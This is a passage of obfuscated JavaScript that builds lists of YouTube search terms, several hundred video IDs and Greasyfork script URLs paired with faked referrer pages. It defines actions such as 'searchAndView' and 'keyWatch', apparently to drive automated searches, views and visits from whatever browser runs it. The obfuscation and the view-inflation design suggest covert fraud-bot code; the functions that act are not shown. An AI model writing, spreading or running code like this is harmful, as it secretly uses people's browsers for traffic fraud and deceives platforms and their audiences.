searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + a1(0x15) + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + a2(0x6) + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x57 * -0x41 + 0xffc + -0x8f * -0xb)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x11ab + -0x988 + 0x1b3d)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x88b * -0x4 + -0xf16 * -0x1 + 0x1 * 0x1319);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    a0(0x1d, 'r*%0') + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    a2(0x13) + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    a0(0x5, 'sw^5') + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    a0(0x7, '03C4') + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    a2(0x10) + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': a0(0xf, 'ML[Q') + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': a0(0x17, 'Gk&f') + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
